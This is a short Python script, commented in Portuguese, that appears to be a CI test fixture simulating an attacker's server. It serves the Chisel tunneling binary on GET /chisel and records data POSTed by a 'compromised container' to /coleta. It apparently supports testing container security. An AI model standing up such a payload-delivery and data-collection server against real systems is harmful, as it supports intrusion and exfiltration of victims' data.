"""Servidor do atacante, só para a prova da CI.

Entrega o binário do Chisel em GET /chisel e guarda em arquivo o que o
contêiner comprometido mandar em POST /coleta. Uso:

    python3 atacante.py <porta> <arquivo do chisel> <arquivo da coleta>
"""

import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

PORTA, CHISEL, COLETA = int(sys.argv[1]), Path(sys.argv[2]), Path(sys.argv[3])
LIMITE_DA_COLETA = 1024 * 1024


class Atacante(BaseHTTPRequestHandler):
    def do_GET(self) -> None:  # noqa: N802 (nome exigido pelo http.server)
        if self.path != "/chisel":
            self.send_error(404)
            return
        corpo = CHISEL.read_bytes()
        self.send_response(200)
        self.send_header("Content-Length", str(len(corpo)))
        self.end_headers()
        self.wfile.write(corpo)

    def do_POST(self) -> None:  # noqa: N802
        tamanho = min(int(self.headers.get("Content-Length", "0")), LIMITE_DA_COLETA)
        with COLETA.open("ab") as arquivo:
            arquivo.write(self.rfile.read(tamanho))
        self.send_response(204)
        self.end_headers()


ThreadingHTTPServer(("0.0.0.0", PORTA), Atacante).serve_forever()  # noqa: S104 (o contêiner chega pelo host-gateway)
